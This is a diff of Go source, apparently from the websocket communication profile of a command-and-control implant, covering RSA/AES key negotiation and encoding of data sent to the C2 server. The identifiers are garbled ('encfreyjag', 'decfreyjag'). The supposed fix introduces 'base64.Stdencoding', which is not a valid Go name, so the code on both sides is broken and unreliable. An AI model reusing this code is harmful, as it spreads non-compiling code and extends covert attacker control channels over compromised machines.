@@ -6,8 +6,8 @@ package profiles
 import (
 	"crypto/rsa"
 	"crypto/tls"
-	"encfreyjag/base64"
-	"encfreyjag/json"
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"log"
 	"math/rand"
@@ -259,7 +259,7 @@ func (c *C2Websockets) NegotiateKey() bool {
 	initMessage := structs.EkeKeyExchangeMessage{}
 	initMessage.Action = "staging_rsa"
 	initMessage.SessionID = sessionID
-	initMessage.PubKey = base64.StdEncfreyjag.EncodeToString(pub)
+	initMessage.PubKey = base64.Stdencoding.EncodeToString(pub)
 
 	// Encode and encrypt the json message
 	raw, err := json.Marshal(initMessage)
@@ -281,9 +281,9 @@ func (c *C2Websockets) NegotiateKey() bool {
 
 	//log.Printf("Received EKE response: %+v\n", sessionKeyResp)
 	// Save the new AES session key
-	encryptedSesionKey, _ := base64.StdEncfreyjag.DecodeString(sessionKeyResp.SessionKey)
+	encryptedSesionKey, _ := base64.Stdencoding.DecodeString(sessionKeyResp.SessionKey)
 	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSesionKey, c.RsaPrivateKey)
-	c.Key = base64.StdEncfreyjag.EncodeToString(decryptedKey) // Save the new AES session key
+	c.Key = base64.Stdencoding.EncodeToString(decryptedKey) // Save the new AES session key
 	c.ExchangingKeys = false
 
 	if len(sessionKeyResp.UUID) > 0 {
@@ -330,7 +330,7 @@ func (c *C2Websockets) sendData(tag string, sendData []byte) interface{} {
 	} else {
 		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
 	}
-	sendData = []byte(base64.StdEncfreyjag.EncodeToString(sendData))
+	sendData = []byte(base64.Stdencoding.EncodeToString(sendData))
 	for true {
 		m.Client = true
 		m.Data = string(sendData)
@@ -352,7 +352,7 @@ func (c *C2Websockets) sendData(tag string, sendData []byte) interface{} {
 			continue
 		}
 
-		raw, err := base64.StdEncfreyjag.DecodeString(resp.Data)
+		raw, err := base64.Stdencoding.DecodeString(resp.Data)
 		if err != nil {
 			//log.Println("Error decfreyjag base64 data: ", err.Error())
 			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
@@ -383,10 +383,10 @@ func (c *C2Websockets) sendData(tag string, sendData []byte) interface{} {
 }
 
 func (c *C2Websockets) encryptMessage(msg []byte) []byte {
-	key, _ := base64.StdEncfreyjag.DecodeString(c.Key)
+	key, _ := base64.Stdencoding.DecodeString(c.Key)
 	return crypto.AesEncrypt(key, msg)
 }
 func (c *C2Websockets) decryptMessage(msg []byte) []byte {
-	key, _ := base64.StdEncfreyjag.DecodeString(c.Key)
+	key, _ := base64.Stdencoding.DecodeString(c.Key)
 	return crypto.AesDecrypt(key, msg)
 }
